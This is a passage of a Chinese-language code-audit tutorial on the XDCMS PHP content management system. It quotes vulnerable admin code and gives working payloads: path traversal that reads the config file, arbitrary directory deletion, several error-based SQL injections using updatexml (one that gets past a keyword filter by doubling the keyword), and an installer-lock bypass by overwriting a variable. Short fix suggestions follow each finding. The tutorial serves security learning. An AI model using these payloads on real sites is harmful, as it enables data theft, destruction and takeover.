            showmsg(C('open_template_error'),'-1');
        }
        flock($fp,LOCK_EX);
        $str=@fread($fp,filesize($file));
        flock($fp,LOCK_UN);
        fclose($fp);
        assign('filename',$filename);
        assign('content',$str);
        template('template_edit','admin');
    }
构造如下url即可查看到指定文件
    http://IP/index.php?m=xdcms&c=template&f=edit&file=../../../data/config.inc.php
当然，这需要管理员身份登录才能进行
**修复建议：**
  * 限制目录跳转
####  管理员后台栏目管理存在SQL注入漏洞
果然还是直接去读源码比较方便
这里的源码如下：
    public function add_save(){
        $config=base::load_cache("cache_set_config","_config");
        $catname=$_POST['catname'];
        $catdir=$_POST['catdir'];
        $thumb=$_POST['thumb'];
        $is_link=intval($_POST['is_link']);
        $url=safe_replace($_POST['url']);
        $model=$_POST['model'];
        $sort=intval($_POST['sort']);
        $is_show=intval($_POST['is_show']);
        $parentid=intval($_POST['parentid']);
        $is_target=intval($_POST['is_target']);
        $is_html=intval($_POST['is_html']);
        $template_cate=$_POST['template_cate'];
        $template_list=$_POST['template_list'];
        $template_show=$_POST['template_show'];
        $seo_title=$_POST['seo_title'];
        $seo_key=$_POST['seo_key'];
        $seo_des=$_POST['seo_des'];
        $modelid=modelid($model);
        if(empty($catname)||empty($catdir)||empty($model)){
            showmsg(C('material_not_complete'),'-1');
        }
        if(!check_str($catdir,'/^[a-z0-9][a-z0-9]*$/')){
            showmsg(C('catdir').C('numbers_and_letters'),'-1');
        }
        if($is_html==1){
            if($config['createhtml']!=1){
                    showmsg(C('config_html_error'),'index.php?m=xdcms&c=setting');
            }
        }
        $nums=$this->mysql->db_num("category","catdir='".$catdir."'");
        if($nums>0){
            showmsg(C('catdir_exist'),'-1');
        }
        $sql="insert into ".DB_PRE."category (catname,catdir,thumb,is_link,url,model,modelid,sort,is_show,is_target,is_html,template_cate,template_list,parentid,template_show,seo_title,seo_key,seo_des) values ('".$catname."','".$catdir."','".$thumb."','".$is_link."','".$url."','".$model."','".$modelid."','".$sort."','".$is_show."','".$is_target."','".$is_html."','".$template_cate."','".$template_list."','".$parentid."','".$template_show."','".$seo_title."','".$seo_key."','".$seo_des."')";
        $this->mysql->query($sql);
        $catid=$this->mysql->insert_id();
        if($is_link==0){//生成url
            $ob_url=base::load_class("url");
            $url=$ob_url->caturl($catid,$catdir,$is_html);
            $this->mysql->db_update("category","`url`='".$url."'","`catid`=".$catid);
        }
        $this->category_cache();
        showmsg(C('add_success'),'-1');
    }
这里有一大堆参数没有任何过滤就直接带入sql语句进行插入了，此处可进行SQL注入
在参数中加个单引号之后提交：
报错啦！直接报错注入即可
构造如下payload进行报错注入：
    seo_des=haha' or updatexml(1,(concat(0x7e,(select version()),0x7e)),1) or '
**修复建议：**
  * 对输入的参数进行过滤
####  管理员后台内容管理处存在SQL注入漏洞
出现问题的函数依然是add_save()，先来看代码：
    public function add_save(){
        $title=safe_html($_POST['title']);
        $commend=intval($_POST['commend']);
        $username=safe_html($_POST['username']);
        $thumb=$_POST['thumb'];
        $keywords=safe_html($_POST['keywords']);
        $description=safe_html($_POST['description']);
        $inputtime=datetime();
        $updatetime=strtotime($_POST['updatetime']);
        $url=$_POST['url'];
        $catid=intval($_POST['catid']);
        $userid=$_SESSION['admin_id'];
        $fields=$_POST['fields'];
        $style=$_POST['title_color']." ".$_POST['title_weight'];
        //此处省略验证数据存在的部分
        //添加content
        $sql="insert into ".DB_PRE."content(title,commend,username,thumb,keywords,description,inputtime,updatetime,url,catid,userid,hits,style) values('{$title}','{$commend}','{$username}','{$thumb}','{$keywords}','{$description}','{$inputtime}','{$updatetime}','{$url}','{$catid}','{$userid}',0,'{$style}')";
        $this->mysql->query($sql);
        $last_id=$this->mysql->insert_id();
依然是一堆参数从POST提交上来没有经过任何过滤就进行了INSERT INTO操作
构造title：
    AASD' or (select updatexml(1,(concat(0x7e,(select version()),0x7e)),1)) or'
即可进行报错注入
**修复建议：**
  * 对输入的参数进行过滤
####  管理员后台数据库管理页面存在任意目录删除漏洞
地址为：`http://ip/index.php?m=xdcms&c=data&f=delete&file=`
这个功能原本是删除备份文件夹的，但是可以通过../进行目录跳转来删除任意文件夹
源码如下：
    public function delete(){
        $file=trim($_GET["file"]);
        $dir=DATA_PATH.'backup/'.$file;
        if(is_dir($dir)){
            //删除文件夹中的文件
            if (false != ($handle = opendir ( $dir ))) {  
                while ( false !== ($file = readdir ( $handle )) ) {   
                    if ($file != "." && $file != ".."&&strpos($file,".")) {  
                    @unlink($dir."/".$file);    
                    }  
                }  
                closedir ( $handle );  
            }  
            @rmdir($dir);//删除目录
        }
        showmsg(C('success'),'-1');
    }
通过GET参数file获取目录名，然后进行判断是否是目录，如果是，则删除目录下的文件再删除目录，如果不是，直接返回 `success`
我们在网站主目录下创建个文件夹123：
然后点击删除操作之后，在Burp中拦截修改：
发送后，我们再来看看网站根目录：
刚刚创建的123目录，没有啦！
**修复建议：**
  * 禁止目录跳转，过滤`../`
####  管理员后台关键词管理页面存在SQL注入漏洞
这里又是一个后台管理页面访问不到的地方，通过输入url：`http://ip/index.php?m=xdcms&c=keywords&f=edit&id=1`才能访问
从这里开始，终于遇到了带有安全过滤防御机制的漏洞
我们先来看源码：
    public function editsave(){
        $id=isset($_POST['id'])?intval($_POST['id']):0;
        $title=safe_html($_POST['title']);
        $url=safe_html($_POST['url']);
        if(empty($title)||empty($url)||empty($id)){
            showmsg(C('material_not_complete'),'-1');
        }
        $this->mysql->db_update('keywords',"`title`='".$title."',`url`='".$url."'",'`id`='.$id);
        $this->keywords_cache();
        showmsg(C('update_success'),'-1');
    }
这里的title参数和url参数被safe_html过滤了，我们来看看这个过滤是怎么回事：
    //安全过滤函数
    function safe_html($str){
        if(empty($str)){return;}
        $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |%|=|/*|*|../|./| union | from | where | group | into |load_file
    |outfile/','',$str);
        return htmlspecialchars($str);
    }
这里进行了黑名单过滤，过滤sql注入常用关键字，将关键字替换为空，这显然很不靠谱嘛
通过双写即可绕过：
Burp拦截，构造payload，发送请求：
    url=http://' or (sselectelect updatexml(2,concat(0x7e,(version())),0)) or '
成功绕过安全过滤，成功注入！
**修复建议：**
  * 对输入的参数进行过滤
####  后台联动菜单管理处存在SQL注入漏洞
源码如下：
    public function add_save(){
        $name=$_POST['name'];
        $parentid=isset($_POST['parentid'])?intval($_POST['parentid']):0;
        if(empty($name)){
            showmsg(C('material_not_complete'),'-1');
        }
        if($parentid!=0){
            $keyid=$this->get_parentid($parentid);
        }else{
            $keyid=0;
        }
        $sql="insert into ".DB_PRE."linkage (name,parentid,keyid) values ('".$name."','".$parentid."','".$keyid."')";
        $this->mysql->query($sql);
        showmsg(C('add_success'),'-1');
    }
无过滤获取参数name，直接带入insert into语句中进行插入操作
构造payload如下：
    name=lalala' or (select updatexml(2,concat(0x7e,(version())),0)) or '
即可报错注入
这个CMS的SQL注入漏洞可谓是多到不行，这里头还有大量漏洞出现原因相同的SQL注入漏洞
这里就不多啰嗦了，
练习到这里，想必对UPDATE，INSERT INTO，SELECT三种SQL语句的SQL注入有了一定掌握，接下来看点不一样的
####  网站安装页面存在全局变量覆盖漏洞
在网站的/install/index.php中开头有如下代码
    foreach(Array('_GET','_POST','_COOKIE') as $_request){
        foreach($$_request as $_k => $_v) ${$_k} = _runmagicquotes($_v);
    }
    function _runmagicquotes(&$svar){
        if(!get_magic_quotes_gpc()){
            if( is_array($svar) ){
                foreach($svar as $_k => $_v) $svar[$_k] = _runmagicquotes($_v);
            }else{
                $svar = addslashes($svar);
            }
        }
        return $svar;
    }
    if(file_exists($insLockfile)){
        exit(" 程序已运行安装，如果你确定要重新安装，请先从FTP中删除 install/install_lock.txt！");
    }
遍历传入的参数对数组进行赋值
然后传入$insLockfile来判断程序是否安装
如果我们在访问这个页面的时候直接在GET参数中加上`?insLockfile=xyz`(反正是一个不存在的文件名就行)则可直接进入安装
**修复建议：**
  * 通过其他方式来检测系统是否已安装
## 总结
该CMS没有使用框架，非常适合新手入门练习使用，当然，存在的漏洞不仅仅有这些，有兴趣的童鞋可以接着去探索，如果你觉得我文章中有什么需要进行改进的地方，欢迎随时与我联系。
最后，非常谢谢大家花费了时间阅读本人的文章，谢谢大家